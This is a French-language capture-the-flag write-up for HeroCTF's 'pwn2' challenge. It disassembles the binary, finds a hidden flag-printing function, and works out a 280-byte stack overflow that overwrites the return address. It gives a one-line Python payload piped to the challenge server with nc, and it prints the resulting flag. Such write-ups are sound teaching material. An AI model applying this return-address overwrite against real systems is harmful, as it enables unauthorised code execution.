Pour cet ultime challenge de pwn, on a uniquement accès au binaire, et non plus au code source comme lors du premier challenge.

Commençons par se renseigner sur ce binaire :
```bash
$ file pwn2 
pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2fc8ebe2b5eee35be7e503226787911a6a55a1c0, for GNU/Linux 3.2.0, not stripped
```
Nous avons donc un binaire 64bits pour Intel (x86-64), non strippé.

On ouvre ce binaire dans notre désassembleur favori (Cutter, IDA, Ghidra, Radare2...) et on regarde la fonction main():
```assembly
120: int main (int argc, char **argv);
; var char **var_120h @ rbp-0x120
; var int64_t var_114h @ rbp-0x114
; var char *s @ rbp-0x110
; var size_t var_4h @ rbp-0x4
; arg int argc @ rdi
; arg char **argv @ rsi
0x004011c0      push    rbp
0x004011c1      mov     rbp, rsp
0x004011c4      sub     rsp, 0x120
0x004011cb      mov     dword [var_114h], edi ; argc
0x004011d1      mov     qword [var_120h], rsi ; argv
0x004011d8      lea     rdi, str.Donne_moi_ton_nom_little_hackerz_: ; 0x402030 ; const char *format
0x004011df      mov     eax, 0
0x004011e4      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x004011e9      lea     rax, [s]
0x004011f0      mov     rsi, rax
0x004011f3      lea     rdi, [0x00402054] ; const char *format
0x004011fa      mov     eax, 0
0x004011ff      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x00401204      lea     rax, [s]
0x0040120b      mov     rdi, rax   ; const char *s
0x0040120e      call    strlen     ; sym.imp.strlen ; size_t strlen(const char *s)
0x00401213      mov     dword [var_4h], eax
0x00401216      lea     rax, [s]
0x0040121d      mov     rsi, rax
0x00401220      lea     rdi, str.Ca_sera_pas_si_simple_cette_fois_jeune___s ; 0x402058 ; const char *format
0x00401227      mov     eax, 0
0x0040122c      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00401231      mov     eax, 0
0x00401236      leave
0x00401237      ret
```
On peut utiliser le décompiler si l'assembleur ne nous semble pas clair (pas de honte à cela !) :
```c
undefined8 main(undefined8 argc, char **argv)
{
    char **var_120h;
    int64_t var_114h;
    undefined8 var_4h;
    
    var_114h._0_4_ = (undefined4)argc;
    printf("Donne-moi ton nom little hackerz : ");
    __isoc99_scanf(0x402054, (int64_t)&var_114h + 4);
    strlen((int64_t)&var_114h + 4);
    printf("Ca sera pas si simple cette fois jeune \"%s\"\n", (int64_t)&var_114h + 4);
    return 0;
}
```
On continue de se balader et on remarque une fonction intéressante !
```bash
$ nm pwn2 
0000000000401182 T afficherFlagG4NG
[...]
```
Voyons voir celle-ci de plus près :
```assembly
62: sym.afficherFlagG4NG ();
0x00401182      push    rbp
0x00401183      mov     rbp, rsp
0x00401186      push    rbx
0x00401187      sub     rsp, 8
0x0040118b      call    geteuid    ; sym.imp.geteuid ; uid_t geteuid(void)
0x00401190      mov     ebx, eax
0x00401192      call    geteuid    ; sym.imp.geteuid ; uid_t geteuid(void)
0x00401197      mov     esi, ebx
0x00401199      mov     edi, eax
0x0040119b      call    setreuid   ; sym.imp.setreuid
0x004011a0      lea     rdi, str.cat_flag.txt ; 0x402008 ; const char *string
0x004011a7      call    system     ; sym.imp.system ; int system(const char *string)
0x004011ac      lea     rdi, str.Point_faible_:_trop_fort. ; 0x402015 ; const char *s
0x004011b3      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x004011b8      nop
0x004011b9      add     rsp, 8
0x004011bd      pop     rbx
0x004011be      pop     rbp
0x004011bf      ret
```
Cette fonction nous donnera le flag sur le serveur !

On constate dans le main que l'on peut écrire sans limite dans le buffer d'input, et on va s'en servir pour overflow le buffer de 256 caractères (0x110 - 0x10 = 0x100 = 256) et réécrire l'adresse de retour : on veut ainsi appeler la fonction `afficherFlagG4NG` qui a pour addresse `0x0000000000401182`.

Dans l'idée on pourrait alors se dire qu'il faut écrire 256 caractères suivis de notre adresse (sans oublier le little endian) et que le tour est joué ! Eh oui... Mais non.

```assembly
120: int main (int argc, char **argv);
; var char **var_120h @ rbp-0x120
; var int64_t var_114h @ rbp-0x114
; var char *s @ rbp-0x110
```
Notre input est stocké dans le buffer identifié comme `char *s` (qui fait donc une taille de 256 octets). L'adresse de retour (un quadword, car on est en x64, soit 8 octets) est pop de la stack via l'instruction `ret` puis mise dans `rip` (instruction pointer) en fin de fonction `main`.
Pour réécrire celle-ci, il nous faudra donc overwrite les int `var_114h` et `var_120h` (8 octets chacun) puis `rbp` (base pointer, qui indique le début de la stack) (8 octets également).

Il nous faudra donc finalement 256+(8\*3) = 280 caractères avant d'avoir la main sur l'adresse de retour.
On peut alors résoudre le challenge grâce à Python (eh oui, encore et toujours)
```bash
$ python -c "print('A')*280+'\x82\x11\x40\x00\x00\x00\x00\x00'" |  nc heroctf.fr 3001
Donne-moi ton nom little hackerz : Ca sera pas si simple cette fois jeune "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FFlag: HeroCTF{4_l177l3_h4rd3r_bu7_571ll_345y_0101}
Point faible : trop fort.
```
HeroCTF{4_l177l3_h4rd3r_bu7_571ll_345y_0101}
